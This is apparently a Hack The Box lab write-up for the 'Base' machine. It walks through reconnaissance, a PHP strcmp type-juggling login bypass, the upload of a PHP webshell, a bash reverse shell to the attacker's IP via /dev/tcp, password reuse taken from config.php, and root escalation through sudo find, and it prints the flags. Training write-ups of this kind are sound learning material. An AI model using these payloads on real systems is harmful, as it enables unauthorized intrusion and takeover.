# Base

|     Local    |     Remote     |
| ------------ | -------------- |
| 10.10.15.155 | 10.129.95.184  |
| 10.10.15.155 | 10.129.95.184  |

----

## Nmap
```
# nmap 10.129.95.184  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 09:58 EDT
Nmap scan report for 10.129.95.184
Host is up (0.045s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds
```

```
# nmap -Pn -sS -sV -sC -O -p 22,80 10.129.95.184
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 09:59 EDT
Nmap scan report for 10.129.95.184
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome to Base
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
```

## HTTP Enumeration

### OPTIONS
- Allowed: GET, POST, OPTIONS, HEAD
```
# curl -X OPTIONS 10.129.95.184 -v
*   Trying 10.129.95.184:80...
* Connected to 10.129.95.184 (10.129.95.184) port 80
> OPTIONS / HTTP/1.1
> Host: 10.129.95.184
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sat, 24 Aug 2024 14:05:51 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Allow: GET,POST,OPTIONS,HEAD
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host 10.129.95.184 left intact
```
```
# nmap -Pn -sV -p 80 --script http-methods 10.129.95.184 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 10:10 EDT
Nmap scan report for 10.129.95.184
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds
```

### NSE Banner
```
# nmap -Pn -p 80 --script banner 10.129.95.184
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 10:08 EDT
Nmap scan report for 10.129.95.184
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```

### robots.txt
- Nada
```
msf6 auxiliary(scanner/http/robots_txt) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Login
- Login page: `http://10.129.95.184/login/login.php`
- Login directory:

![image](https://github.com/user-attachments/assets/7441fb52-ce39-4ca2-97cc-2bfda219ab9f)

A swap (.swp) file store content for the specific file — for example, while you’re editing a file with vim. They are set up when you start an edit session and then automatically removed when you’re done unless some problem occurs and your editing session doesn’t complete properly. In that case, vim will offer you a chance to recover your work where you left off. [Source](https://www.networkworld.com/article/939724/what-are-unix-swap-swp-files.html).
- If the file being edited were called chkAccts.sh, for example, the swap file set up when you begin your edit would be called `.chkAccts.sh.swp`.
- You could spot it sitting in the same directory were you to look for it from another window or login session.

Therefore `login.php.swp` appears to be a swap file for a previous login that hung up.

I opened the .swp file in a text editor (there is a lot of garbage; it's not plain text). 
- **NOTE:** The login form uses the PHP function `strcmp()` ([string comparison](https://www.w3schools.com/php/func_string_strcmp.asp)) to compare the user entered username/password to saved values.
- The `strcmp()` function will return 0 (zero) if both values are the same (else it returns a positive or negative number).

***See below.***

## Directory Busting

### DirB
- DirB did not like large files of names. 
```
# dirb http://10.129.95.184                                                        

---- Scanning URL: http://10.129.95.184/ ----
==> DIRECTORY: http://10.129.95.184/assets/                                                                                                               
==> DIRECTORY: http://10.129.95.184/forms/                                                                                                                
+ http://10.129.95.184/index.html (CODE:200|SIZE:39344)                                                                                                   
==> DIRECTORY: http://10.129.95.184/login/                                                                                                                
+ http://10.129.95.184/server-status (CODE:403|SIZE:278)                                                                                                  
                                                                                                                                                          
---- Entering directory: http://10.129.95.184/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                          
---- Entering directory: http://10.129.95.184/forms/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                          
---- Entering directory: http://10.129.95.184/login/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Aug 24 10:53:28 2024
DOWNLOADED: 4612 - FOUND: 2

```

### DirBuster
- Found the same ones: assets, forms, logins. And then it found icons. Whoopteedoo...

### GoBuster

```
# gobuster dir -u http://10.129.95.184 -w /usr/share/wordlists/dirb/common.txt -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.184
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://10.129.95.184/assets/]
/forms                (Status: 301) [Size: 314] [--> http://10.129.95.184/forms/]
/index.html           (Status: 200) [Size: 39344]
/login                (Status: 301) [Size: 314] [--> http://10.129.95.184/login/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

### Tweak my Directory File
- The HTB question shows the answer to have this syntax: `/_*****d`
- So, I took a couple of the common directory wordlist files and shoved them through this python script to prepend an underline to each value in the file:

```
import sys

if len(sys.argv) == 3: 

    # Open the file from the argument provided
    input_file = open(sys.argv[1], 'r')

    # Open the file to which to write:
    output_file = open(sys.argv[2], 'w')

    counter = 0

    # Append "_" to each line/value and write
    for line in input_file:
        print(line.rstrip("\n") + " >> " + "_" + line.rstrip("/n"), end='')
        output_file.write("_" + line)
        counter += 1

else:
    print("Usage: 'underline.py inputFileName outputFileName.")
    exit()

input_file.close()
output_file.close()

print()
print("Processed " + str(counter) + " directory names.")

exit()
```

Then I ran GoBuster with my modified file: 

```
# gobuster dir -u http://10.129.95.184 -w gman_common1.txt -b 403,404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.184
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                gman_common1.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/_uploaded            (Status: 301) [Size: 318] [--> http://10.129.95.184/_uploaded/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

**Answer:** `/_uploaded`

## SSH

### NMap

```
# nmap -sCV -p 22 10.129.95.184
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 12:52 EDT
Nmap scan report for 10.129.95.184
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### SearchSploit

```
# searchsploit openssh
...
OpenSSH < 7.7 - User Enumeration (2)  | linux/remote/45939.py
...
```

Tried it. Could not get it to work. Python, Python2, Python3 did not work. Syntax errors in the file.

## Look Inside the Swap File

1. Try to open it in vim: `vim -r login.php.swp`
- Doesn't look like I got it. Note "lines missing":

```
    <!-- ======= Login Section ======= -->
    <section id="login" class="contact section-bg" style="padding: 160px 0">
      <div class="container" data-aos="fade-up">

        <div class="section-title mt-5" >
          <h2>Login</h2>
          <p>Use the form below to log into your account.</p>
        </div>

        <div class="row mt-2">

          <div class="col-lg-12 mt-5 mt-lg-0">

            <form id="login-form" action="" method="POST" role="form" style="background-color:#f8fbfe">
              <div class="row" align="center">
                <div class="form-group">
                  <input type="text" name="username" class="form-control" style="max-width: 30%;" id="username" placeholder="Your Username" required>
???LINES MISSING
  <script src="../assets/js/main.js"></script>
```

2. Try Linux command `strings`:
- The file prints out upside down. Export to a text file and use `tac` to read it in reverse (`tac` is `cat` in reverse).
- The salient portion: 

```
session_start();
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
```

**From the Walk-Through:**
- The `strcmp()` function is used for string comparison and returns 0 when the two inputted values are identical.
- If `strcmp()` is given an empty array to compare against the stored password, it will return `NULL`. In PHP the `==` operator only checks the value of a variable for equality, and the value of `NULL` is equal to 0.
- The correct way to write this would be with the `===` operator which checks both value and type.
- These are prominently known as "Type Juggling bugs" and a detailed video explanation on this can be found [here](https://youtu.be/idC5SAsKhlE?si=wfDIkaUGzk2VnUfH).

In PHP, variables can be easily converted into arrays if we add `[]` in front of them. For example:
```
$username = "Admin"
$username[] = "Admin"
```

In order to exploit this vulnerability, we will need to intercept the login request in BurpSuite.

## Burp

Capture the login POST:
```
POST /login/login.php HTTP/1.1
Host: 10.129.95.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://10.129.95.184
Connection: keep-alive
Referer: http://10.129.95.184/login/login.php
Cookie: PHPSESSID=3l6ho9a5isro6f2ci8on3l1g11
Upgrade-Insecure-Requests: 1

username=uname&password=pwd
```

Change the username and password variables to arrays and remove the values (so they are empty arrays): 
- Note: You may have to click "Forward" several times.
```
username[]=&password[]=
```

This converts the variables to arrays and after forwarding the request, strcmp() returns true and the login is successful. 
- Once logged in, we see a file upload functionality.

Upload a test file. Since you know the site runs PHP, upload this and open it:
```
echo "<?php phpinfo(); ?>" > test.php
```

Open `http://10.129.95.184/_uploaded/` in a browser and click on the test.php file.
- If you get a butt-metric-ton of PHP information, you're in.

Go get [PenTest Monkey's Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell).
- Change the necesary variables (vim).
- Upload it.
- Set up a listener.
- Run the reverse shell.

```
# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.15.155] from (UNKNOWN) [10.129.95.184] 33790
Linux base 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 00:46:41 up 28 min,  0 users,  load average: 0.02, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

And we can look around...
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@base:/$ cd home
cd home
www-data@base:/home$ ls
ls
john
www-data@base:/home$ cd john
cd john
www-data@base:/home/john$ ls
ls
user.txt
www-data@base:/home/john$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

Okay, let's see if we can get into the config.php file used to compare login creds.
```
www-data@base:/home/john$ cd /var/www/html
cd /var/www/html
www-data@base:/var/www/html$ ls
ls
_uploaded  assets  forms  index.html  login  logout.php  upload.php
www-data@base:/var/www/html$ cd login
cd login
www-data@base:/var/www/html/login$ ls
ls
config.php  login.php  login.php.swp
www-data@base:/var/www/html/login$ cat config.php
cat config.php
<?php
$username = "admin";
$password = "thisisagoodpassword";
```

Really?
- That only got me logged into the website again (at the upload page).
- Didn't work on ssh and didn't with with `su -`

Walk-Through
1. Create webshell.php with content: `<?php echo system($_REQUEST['cmd']);?>`
2. Upload that. Run it. You get a blank page.
3. In the URL append: `?cmd=id`. You should get a return when PHP executes that command.
- This got me basically the same thing as the reverse shell: `uid=33(www-data)`

Catch the ?cmd in Burp and send it to Repeater: 
- Right-click and "Change request method" to POST
```
POST /_uploaded/webshell.php HTTP/1.1
Host: 10.129.95.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=3l6ho9a5isro6f2ci8on3l1g11
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

cmd=id
```

Change that last line to: 
```
cmd=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'
# which would be:
cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.155/1234 0>&1'
```

In order to execute our payload, we will have to first URL encode it.
- Highlight the code (everything after `cmd-=`) and hit CTRL+U.
- You end up with:
```
cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.155/1234+0>%261'
```

Okay. Got the same reverse shell as I did with Monkey's php file. 

Walk-Through: System administrators often re-use passwords between web and system accounts so that they do not forget them.
- He used the password from the config.php file to ssh into the system as john
- That got me in as john

```
$ ssh john@10.129.95.184
john@10.129.95.184's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-151-generic x86_64)

john@base:~$ ls
user.txt
john@base:~$ cat user.txt 
f54846c258f3b4612f78a819573d158e
```

`sudo -l` to list the allowed (and forbidden) commands for the invoking user.
```
john@base:/$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on base:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find
```

`find` can be used to [break out](/Methodology_and_Resources/GTFOBins.md) and escalate privileges pretty easily: 
```
john@base:/$ sudo find . -exec /bin/sh \; -quit
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
51709519ea18ab37dd6fc58096bea949
```

![image](https://github.com/user-attachments/assets/f7f0b1ae-afa4-4ddd-aa70-f765b5658133)
